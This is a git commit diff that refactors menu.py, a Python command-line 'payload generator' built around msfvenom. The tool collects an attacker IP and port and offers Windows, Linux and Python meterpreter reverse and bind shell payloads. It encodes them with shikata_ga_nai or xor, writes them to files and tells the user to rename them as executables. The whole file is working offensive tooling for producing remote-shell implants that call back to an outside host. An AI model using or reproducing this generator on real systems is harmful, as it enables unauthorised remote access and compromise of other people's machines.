008e812ad5dcd74e04b307213cc533a269fda429
str1ke007 <73118143+str1ke007@users.noreply.github.com>
2023-08-03 00:09:34 +0530

    Update menu.py
    Major update: 
    asynchronous programming to seamlessly create concurrent tasks.
    added oops concept
    reworked the code
    robust exception handling

--- menu.py
+++ menu.py
@@ -1,260 +1,282 @@
 #!/usr/bin/python3
 
+import asyncio
 import subprocess
 import re
 import os
-from time import sleep
 import sys
 
-# TODO:
-# 	Add new commands
-#	Improve the code
-# 	code into classes
-# 	add more payloads
-#	Bugs and Glitches
+class Colors:
+    BLACK = "\033[1;30m"
+    RED = "\033[1;31m"
+    GREEN = "\033[1;32m"
+    YELLOW = "\033[1;33m"
+    BLUE = "\033[1;34m"
+    MAGENTA = "\033[1;35m"
+    CYAN = "\033[1;36m"
+    WHITE = "\033[1;37m"
+    BOLD = "\033[1m"
 
 
-BLACK = "\033[1;30m"
-RED = "\033[1;31m"
-GREEN = "\033[1;32m"
-YELLOW = "\033[1;33m"
-BLUE = "\033[1;34m"
-MAGENTA = "\033[1;35m"
-CYAN = "\033[1;36m"
-WHITE = "\033[1;37m"
-BOLD = "\033[1m"
-regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
-ninput = f"{BOLD}{YELLOW}pg~#{WHITE} "
-comm = (
-    'lists',
-    'preinfo',
-    'payload',
-    'display',
-    'run',
-)
-IP = "0.0.0.0"
-PORT = 1234
-ARCH = "x86"
-PAYLOAD = ""
+class PayloadGenerator:
+    def __init__(self):
+        self.IP = "0.0.0.0"
+        self.PORT = 1234
+        self.ARCH = "x86"
+        self.PAYLOAD = ""
 
+    def list_directory(self):
+        try:
+            current_directory = os.getcwd()
+            print(f"{Colors.GREEN}[+] Current Directory: {current_directory}\n")
+            contents = os.listdir(current_directory)
+            for item in contents:
+                print(item)
+        except Exception as e:
+            print(f"{Colors.RED}[-] Error: {e}")
 
-def info():
-    print(f"""\n{RED}
-        ██████╗░░█████╗░██╗░░░██╗██╗░░░░░░█████╗░░█████╗░██████╗░
-        ██╔══██╗██╔══██╗╚██╗░██╔╝██║░░░░░██╔══██╗██╔══██╗██╔══██╗
-        ██████╔╝███████║░╚████╔╝░██║░░░░░██║░░██║███████║██║░░██║
-        ██╔═══╝░██╔══██║░░╚██╔╝░░██║░░░░░██║░░██║██╔══██║██║░░██║
-        ██║░░░░░██║░░██║░░░██║░░░███████╗╚█████╔╝██║░░██║██████╔╝
-        ╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░
+    def run(self):
+        if not self.pre_requisite():
+            print(f"{Colors.RED}\n\n[-] Metasploit is not installed.")
+            sys.exit(1)
 
-        ░██████╗░███████╗███╗░░██╗███████╗██████╗░░█████╗░████████╗░█████╗░██████╗░
-        ██╔════╝░██╔════╝████╗░██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
-        ██║░░██╗░█████╗░░██╔██╗██║█████╗░░██████╔╝███████║░░░██║░░░██║░░██║██████╔╝
-        ██║░░╚██╗██╔══╝░░██║╚████║██╔══╝░░██╔══██╗██╔══██║░░░██║░░░██║░░██║██╔══██╗
-        ╚██████╔╝███████╗██║░╚███║███████╗██║░░██║██║░░██║░░░██║░░░╚█████╔╝██║░░██║
-        ░╚═════╝░╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
-    \n
-    {CYAN}
-    Pg v1.0 Alpha
-    Written by str1ke007
+        self.info()
+        while True:
+            try:
+                command = input(f"{Colors.BOLD}{Colors.YELLOW}pg~#{Colors.WHITE} ")
+                if 'lists' in command.casefold():
+                    self.lists()
+                elif 'preinfo' in command.casefold():
+                    self.preinfo()
+                elif 'payload' in command.casefold():
+                    self.select_payload()
+                elif 'display' in command.casefold():
+                    self.display_info()
+                elif 'run' in command.casefold():
+                    asyncio.run(self.generate_payload_file())
+                elif 'ls' in command.casefold():    # added new command
+                    self.list_directory()
+                elif command.casefold() in ('clear', 'cls'):
+                    os.system('cls||clear')
+                elif 'exit' in command.casefold():
+                    print(f"{Colors.BLUE}[-] Thank you for trying out!\n\n")
+                    sys.exit()
+                else:
+                    pass
+            except KeyboardInterrupt:
+                print(f"{Colors.BLUE}[-] Type {Colors.RED}'exit'{Colors.BLUE} to quit\n")
+            except Exception as e:
+                print(f"{Colors.RED}[-] Error: {e}")
 
-    {BOLD}{YELLOW}'lists' to display the command
+    def info(self):
+        print(f"""\n{Colors.RED}
+            ██████╗░░█████╗░██╗░░░██╗██╗░░░░░░█████╗░░█████╗░██████╗░
+            ██╔══██╗██╔══██╗╚██╗░██╔╝██║░░░░░██╔══██╗██╔══██╗██╔══██╗
+            ██████╔╝███████║░╚████╔╝░██║░░░░░██║░░██║███████║██║░░██║
+            ██╔═══╝░██╔══██║░░╚██╔╝░░██║░░░░░██║░░██║██╔══██║██║░░██║
+            ██║░░░░░██║░░██║░░░██║░░░███████╗╚█████╔╝██║░░██║██████╔╝
+            ╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░
 
-    {CYAN}github: https://github.com/str1ke007 {WHITE}
-    """)
+            ░██████╗░███████╗███╗░░██╗███████╗██████╗░░█████╗░████████╗░█████╗░██████╗░
+            ██╔════╝░██╔════╝████╗░██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
+            ██║░░██╗░█████╗░░██╔██╗██║█████╗░░██████╔╝███████║░░░██║░░░██║░░██║██████╔╝
+            ██║░░╚██╗██╔══╝░░██║╚████║██╔══╝░░██╔══██╗██╔══██║░░░██║░░░██║░░██║██╔══██╗
+            ╚██████╔╝███████╗██║░╚███║███████╗██║░░██║██║░░██║░░░██║░░░╚█████╔╝██║░░██║
+            ░╚═════╝░╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
+        \n
+        {Colors.CYAN}
+        Pg v1.2 Alpha
+        Written by str1ke007
+        Copyright©
 
+        {Colors.BOLD}{Colors.YELLOW}'lists' to display the command
 
-def menu():
-	print(f"\n\n\t\t {MAGENTA}PAYLOAD MENU\n\n")
-	print(f"{GREEN}1) Windows")
-	print(f"{GREEN}2) Linux(x86/x64)")
-	print(f"{GREEN}3) Python Script")
+        {Colors.CYAN}github: https://github.com/str1ke007 {Colors.WHITE}
+        """)
 
+    def lists(self):
+        print(f"\n{Colors.RED}preinfo{Colors.WHITE}\t\tenter basic details")
+        print(f"{Colors.RED}payload{Colors.WHITE}\t\tdisplays info about the available payloads")
+        print(f"{Colors.RED}run{Colors.WHITE}\t\trun the generator")
+        print(f"{Colors.RED}display{Colors.WHITE}\t\tdisplay parameters")
+        print(f"{Colors.RED}ls{Colors.WHITE}\t\tlists directory contents and current directory")
+        print(f"{Colors.RED}clear{Colors.WHITE}\t\tclear screen")
+        print(f"{Colors.RED}exit{Colors.WHITE}\t\texit\n")
 
-def lists():
-    print(f"\n{RED}preinfo{WHITE}\t\tenter basic details")
-    print(f"{RED}payload{WHITE}\t\tdisplays info about the available payloads")
-    print(f"{RED}run{WHITE}\t\trun the generator")
-    print(f"{RED}display{WHITE}\t\tdisplay all")
-    print(f"{RED}clear{WHITE}\t\tclear screen")
-    print(f"{RED}exit{WHITE}\t\texit\n")
-
-
-def display(IP, PORT, ARCH):
-    if IP and PORT and ARCH:
-        print(f"\n{MAGENTA}IP\t: {IP}")
-        print(f"PORT\t: {PORT}")
-        if ARCH == 1:
+    def display_info(self):
+        print(f"\n{Colors.MAGENTA}IP\t: {self.IP}")
+        print(f"PORT\t: {self.PORT}")
+        if self.ARCH == "x64":
             print(f"ARCH\t: x64\n")
         else:
             print(f"ARCH\t: x86\n")
-
-
-def display_payload(PAYLOAD):
-    try:
-        print(f"PAYLOAD\t: {PAYLOAD}\n{WHITE}")
-    except:
-        print(f"\n\n{RED}[-] No payload to display{WHITE}\n\n")
-
-
-def payload():
-    # Windows
-    windows = {
-        1: "windows/meterpreter/reverse_http",
-        2: "windows/meterpreter/reverse_https",
-        3: "windows/meterpreter/reverse_tcp",
-    }
-
-    # Linux
-    linux = {
-        1: "linux/x86/meterpreter/reverse_http",
-        2: "linux/x86/meterpreter/reverse_https",
-        3: "linux/x86/meterpreter/reverse_tcp",
-        4: "linux/x64/meterpreter/reverse_http",
-        5: "linux/x64/meterpreter/reverse_https",
-        6: "linux/x64/meterpreter/reverse_tcp",
-    }
-
-    # Python
-    python = {
-        1: "python/meterpreter/reverse_http",
-        2: "python/meterpreter/reverse_https",
-        3: "python/meterpreter/reverse_tcp",
-    }
-    try:
-        menu()
-        OP = int(input(f"{ninput}"))
-    except ValueError:
-            print(f"{RED}\n[-] Invalid Input!\n{WHITE}")
-    print("\n")
-    if OP == 1:
-        for key, value in windows.items():
-            print(f"{RED}{key}{WHITE}", value, sep=" : ")
-        PAYLOAD = entry()
-        for key, value in windows.items():
-            if key == PAYLOAD:
-                str(PAYLOAD)
-                PAYLOAD = value
-    elif OP == 2:
-        for key, value in linux.items():
-            print(f"{RED}{key}{WHITE}", value, sep=": ")
-        PAYLOAD = entry()
-        for key, value in linux.items():
-            if key == PAYLOAD:
-                str(PAYLOAD)
-                PAYLOAD = value
-    else:
-        for key, value in python.items():
-            print(f"{RED}{key}{WHITE}", value, sep=": ")
-        PAYLOAD = entry()
-        for key, value in python.items():
-            if key == PAYLOAD:
-                str(PAYLOAD)
-                PAYLOAD = value
-    print("\n")
-    return OP, PAYLOAD
-
-
-def entry():
-    try:
-        PAYLOAD = int(input(f"{ninput}"))
-    except ValueError:
-        print(f"{RED}\n[-] Invalid Input!\n{WHITE}")
-    return PAYLOAD
-
-
-def check(IP):
-    if(re.search(regex, IP)):
-        return 1
-    else:
-        return 0
-
-
-def pre_requisite():
-	from shutil import which
-	return which("msfvenom") is not None
-
-
-def preinfo():
-    while True:
-        print(f"\n\t{BLUE}Available Options\n{RED}  IP\n  PORT\n  ARCHITECTURE\n\n{CYAN}IP?\n")
-        IP = input(f"{ninput}")
         try:
-            print(f"\n{CYAN}PORT?\n")
-            PORT = int(input(f"{ninput}"))
+            self.display_payload()
         except:
-            PORT = 1234
-            print(f"{RED}\n[-] Invalid PORT\n{GREEN}[+] Selecting Default PORT=1234\n")
-            sleep(2)
-        if check(IP) and PORT in range(2, 65536):
-            break
+            print(f"\n\n{Colors.RED}[-] No payload to display{Colors.WHITE}\n\n")
+
+    def display_payload(self):
+        print(f"PAYLOAD\t: {self.PAYLOAD}\n{Colors.WHITE}")
+
+    def pre_requisite(self):
+        from shutil import which
+        return which("msfvenom") is not None
+
+    def check(self, IP):
+        regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
+        return bool(re.search(regex, IP))
+
+    def select_payload(self):
+        # Payload
+        payload = {
+            1: "windows/meterpreter/reverse_http",
+            2: "windows/meterpreter/reverse_https",
+            3: "windows/meterpreter/reverse_tcp",
+            4: "linux/x86/meterpreter/bind_tcp",
+            5: "linux/x86/meterpreter/reverse_tcp",
+            6: "linux/x64/meterpreter/bind_tcp",
+            7: "linux/x64/meterpreter/reverse_tcp",
+            8: "python/meterpreter/reverse_http",
+            9: "python/meterpreter/reverse_https",
+            10: "python/meterpreter/reverse_tcp",
+        }
+
+        print("\n")
+        self.menu(payload, "Payload Options")
+
+    def menu(self, options, title):
+        print(f"{Colors.GREEN}{title}")
+        for key, value in options.items():
+            print(f"{Colors.GREEN}{key}{Colors.WHITE}", value, sep=" : ")
+
+        PAYLOAD = self.get_payload_choice()
+        selected_payload = options.get(PAYLOAD)
+        if selected_payload is not None:
+            self.PAYLOAD = selected_payload
+            print(f"\n{Colors.GREEN}[+] Payload selected: {selected_payload}\n")
         else:
-            print(f"\n\n{RED}[-] Invalid IP\n\n[-] Please wait...")
-            sleep(2)
+            print(f"\n{Colors.RED}[-] Invalid Payload option. Please try again.\n")
 
-    print(f"\n{RED}Architecture (Default -> x86){GREEN}\n1) x64\n2) x86\n")
-    # Architecture Default (x86)
-    ARCH = input(f"{ninput}")
-    if not ARCH:
-        ARCH=2
-
-    return IP, PORT, ARCH
-
-
-def run(IP, PORT, ARCH, OP, PAYLOAD):
-    try:				
-        print(f"\n{CYAN}[+] Please wait for few minutes...\n{CYAN}")
-        result = subprocess.call([f"./meta.sh", f"{IP}", f"{PORT}", f"{OP}", f"{ARCH}", f"{PAYLOAD}"])
-        if not result:
-            print(f"\n{GREEN}[+] Successful\n[+] File saved in {os.getcwd()}\n")
-        else:
-            print(f"{RED}[-] Error!")
-    except:
-        print(f"{RED}Invalid Input!")
-
-
-def main():
-    if pre_requisite() == False:
-            print(f"{RED}\n\n[-] Metasploit is not installed.")
-            sleep(4)
-            sys.exit()
-    info()
-    while True:
+    def get_payload_choice(self):
         try:
-            command = input(f"{ninput}")
-            if 'lists' in command.casefold():
-                lists()
-            elif 'preinfo' in command.casefold():
-                IP, PORT, ARCH = preinfo()
-            elif 'payload' in command.casefold():
-                OP, PAYLOAD = payload()
-            elif 'display' in command.casefold():
-                try:
-                    display(IP, PORT, ARCH)
-                    try:
-                        display_payload(PAYLOAD)
-                    except:
-                        pass
-                except:
-                    print(f"\n{MAGENTA}IP\t: 0.0.0.0 {RED}(not Default){MAGENTA}")
-                    print(f"PORT\t: 1234")
-                    print(f"ARCH\t: x86")
-                    print(f"PAYLOAD\t: None\n{WHITE}")
-            elif 'run' in command.casefold():
-                try:
-                    run(IP, PORT, ARCH, OP, PAYLOAD)
-                except:
-                    print(f"\n\n{RED}[-] IP/PORT/PAYLOAD ?\n\n{WHITE}")
-            elif command.casefold() in ('clear', 'cls'):
-                os.system('clear')
-            elif 'exit' in command.casefold():
-                print(f"\n{BLUE}[-] Thank you for trying out!\n\n")
-                sys.exit()
-            else:
-                pass
-        except KeyboardInterrupt:
-            print(f"\n\n{BLUE}[-] Type {RED}'exit'{BLUE} to quit\n")
+            PAYLOAD = int(input(f"{Colors.BOLD}{Colors.YELLOW}pg~#{Colors.WHITE} "))
+            return PAYLOAD
+        except ValueError:
+            print(f"{Colors.RED}\n[-] Invalid Input! Please enter a number corresponding to the payload.\n{Colors.WHITE}")
+            return None
 
+    def preinfo(self):
+        while True:
+            print(f"\n\t{Colors.BLUE}Available Options\n{Colors.RED}  IP\n  PORT\n  ARCHITECTURE\n\n{Colors.CYAN}IP?\n")
+            IP = input(f"{Colors.BOLD}{Colors.YELLOW}pg~#{Colors.WHITE} ")
+            if self.check(IP):
+                try:
+                    print(f"\n{Colors.CYAN}PORT?\n")
+                    PORT = int(input(f"{Colors.BOLD}{Colors.YELLOW}pg~#{Colors.WHITE} "))
+                    if PORT in range(2, 65535):
+                        arch_options = {
+                            1: "x64",
+                            2: "x86"
+                        }
+                        print(f"\n{Colors.RED}Architecture (Default -> x86){Colors.GREEN}\n1) x64\n2) x86\n")
+                        arch_input = input(f"{Colors.BOLD}{Colors.YELLOW}pg~#{Colors.WHITE} ")
+                        ARCH = int(arch_input) if arch_input.isdigit() else 2
+
+                        if ARCH not in arch_options:
+                            print(f"{Colors.RED}\n[-] Invalid ARCH option. Selecting Default ARCH=x86\n")
+                            ARCH = 2
+
+                        self.IP, self.PORT, self.ARCH = IP, PORT, arch_options[ARCH]
+                        break
+                    else:
+                        print(f"{Colors.RED}\n[-] Invalid PORT number. Please enter a value between 1 and 65535.\n")
+                except ValueError:
+                    print(f"{Colors.RED}\n[-] Invalid PORT format. Please try again.\n")
+            else:
+                print(f"{Colors.RED}\n[-] Invalid IP address format. Please try again.\n")
+
+    async def generate_payload(self):
+        try:
+            if not self.pre_requisite():
+                print(f"{Colors.RED}\n\n[-] Metasploit is not installed.")
+                return
+
+            self.info()
+
+            while True:
+                try:
+                    command = input(f"{Colors.BOLD}{Colors.YELLOW}pg~#{Colors.WHITE} ")
+                    if 'lists' in command.casefold():
+                        self.lists()
+                    elif 'preinfo' in command.casefold():
+                        await self.preinfo()
+                    elif 'payload' in command.casefold():
+                        await self.select_payload()
+                    elif 'display' in command.casefold():
+                        self.display_info()
+                    elif 'run' in command.casefold():
+                        await self.generate_payload_file()
+                    elif command.casefold() in ('clear', 'cls'):
+                        os.system('clear')
+                    elif 'exit' in command.casefold():
+                        print(f"{Colors.BLUE}[-] Thank you for trying out!\n\n")
+                        return
+                    else:
+                        pass
+                except KeyboardInterrupt:
+                    print(f"{Colors.BLUE}[-] Type {Colors.RED}'exit'{Colors.BLUE} to quit\n")
+                except Exception as e:
+                    print(f"{Colors.RED}[-] Error: {e}")
+        except Exception as e:
+            print(f"{Colors.RED}[-] Error: {e}")
+
+    def cleanup_subprocess(self):
+        if hasattr(self, 'process') and self.process.returncode is None:
+            self.process.terminate()
+            self.process.wait()
+
+    async def generate_payload_file(self):
+        if not self.IP or not self.PORT or not self.PAYLOAD:
+            print(f"{Colors.RED}[-] Incomplete payload information! Please run 'preinfo' and 'payload' commands first.")
+            return
+
+        try:
+            print(f"\n{Colors.CYAN}[+] Please wait for a few minutes...\n{Colors.CYAN}")
+            arch_option = "x64" if self.ARCH == "x64" else "x86"
+
+            platforms = {
+                "windows": ["Windows", "x64/xor" if self.ARCH == "x64" else "x86/shikata_ga_nai"],
+                "linux": ["Linux", "x64/xor" if self.ARCH == "x64" else "x86/shikata_ga_nai"],
+                "python": ["python", ""]
+            }
+
+            payload_type = self.PAYLOAD.split('/')[0]
+            platform_info = platforms.get(payload_type)
+            if platform_info is None:
+                print(f"{Colors.RED}[-] Invalid Payload!")
+                return
+
+            platform, encoder = platform_info
+
+            output_file = f"reverse.{payload_type}"
+            if payload_type == "python":
+                cmd = ["msfvenom", "-p", self.PAYLOAD, f"LHOST={self.IP}", f"LPORT={self.PORT}", "--platform", platform, "-f", "raw", "-o", output_file]
+            else:
+                cmd = ["msfvenom", "-p", self.PAYLOAD, f"LHOST={self.IP}", f"LPORT={self.PORT}", "--platform", platform, "--encoder", encoder, "--arch", arch_option, "-f", "raw", "-o", output_file]
+
+            process = await asyncio.create_subprocess_exec(*cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            stdout, stderr = await process.communicate()
+
+            if process.returncode == 0:
+                print(f"{Colors.GREEN}[+] Successful\n[+] File saved in {os.getcwd()}/{output_file}\n")
+                print(f"{Colors.GREEN}[+] Change the extension of the output file as follows\n\tWindows: *.exe\n\tLinux: *.elf\n\tPython: *.py\n")
+            else:
+                print(f"{Colors.RED}[-] Error: Payload generation failed. Please check your input and try again.")
+                if stderr:
+                    print(f"{Colors.RED}[+] Error Output: {stderr.decode('utf-8')}")
+        except Exception as e:
+            print(f"{Colors.RED}[-] Error: {e}")
 
 if __name__ == "__main__":
-    main()
+    payload_generator = PayloadGenerator()
+    payload_generator.run()
